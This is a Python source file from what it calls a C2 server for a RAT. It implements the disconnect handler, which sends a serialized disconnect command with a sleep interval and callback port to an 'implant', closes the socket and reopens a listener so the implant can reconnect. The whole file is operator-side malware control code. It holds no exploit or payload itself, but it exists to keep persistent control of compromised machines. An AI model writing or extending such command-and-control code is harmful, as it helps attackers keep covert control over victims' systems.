# File implements all disconnect functionality for the C2

import socket

import RAT
import Common


def handleDisconnect(sock : socket.socket, callback : int, callback_port : int) -> bool:

    # DisconnectCommand -> CommandDetails -> Command
    disconnect_sleep = Common.DisconnectCommand(sleep=callback, callbackport=callback_port)
    disconnect_details = Common.CommandDetails(disconnectcommand=disconnect_sleep)
    disconnect_command = Common.Command(command=Common.Commands.disconnect, commanddetails=disconnect_details)

    bytes_sent = sock.send(bytes(disconnect_command))

    print(f"Sent {bytes_sent} bytes to implant")
    
    print("Closing connection to implant...")
    sock.close()

    # Now re-establish our connection to our implant (if the user wanted to)
    if (callback_port != 0):
        print(f"Reopening port {callback_port} for implant to call back in on...")
        sock = RAT.establishConnection('0.0.0.0', callback_port)
        if (not sock):
            print("Failed to re-establish connection with implant!")
            return False

    return True